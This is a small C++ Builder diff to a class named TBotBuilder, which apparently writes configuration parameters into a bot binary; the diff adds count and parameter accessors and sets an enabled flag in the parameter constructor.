@@ -294,6 +294,18 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 	return true;
 }
 
+//-----------------------------------------------------------------
+int __fastcall TBotBuilder::GetCount()
+{
+	return FParams->Count;
+}
+//-----------------------------------------------------------------
+
+TBotParam* __fastcall TBotBuilder::GetParam(int Index)
+{
+	return (TBotParam*)FParams->Items[Index];
+}
+//-----------------------------------------------------------------
 
 // Функция записывает данные в буфер
 void __fastcall TBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* Param)
@@ -652,6 +664,7 @@ __fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypte
 	if (Size == 0)
 		throw Exception("Unknown param size!");
 
+	FEnabled = true;
 	FEncrypted = Encrypted;
 	FOwner = AOwner;
 	FTitle = Title;
